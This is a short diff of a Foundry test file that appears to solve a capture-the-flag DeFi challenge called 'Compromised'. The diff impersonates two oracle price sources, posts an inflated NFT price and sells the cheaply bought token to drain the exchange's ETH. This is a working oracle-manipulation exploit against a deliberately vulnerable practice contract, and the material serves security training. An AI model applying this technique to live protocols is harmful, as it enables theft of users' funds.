@@ -96,9 +96,21 @@ contract CompromisedChallenge is Test {
         // console.log(newPrice);
 
         vm.startPrank(player);
-        exchange.buyOne{value : PLAYER_INITIAL_ETH_BALANCE}();
+        uint256 tokenId = exchange.buyOne{value : PLAYER_INITIAL_ETH_BALANCE}();
         vm.stopPrank();
 
+        vm.startPrank(source1);
+        oracle.postPrice(nft.symbol(),EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+
+        vm.startPrank(source2);
+        oracle.postPrice(nft.symbol(),EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+
+        vm.startPrank(player);
+        nft.approve(address(exchange),tokenId);
+        exchange.sellOne(tokenId);
+        vm.stopPrank();
 
     }
 
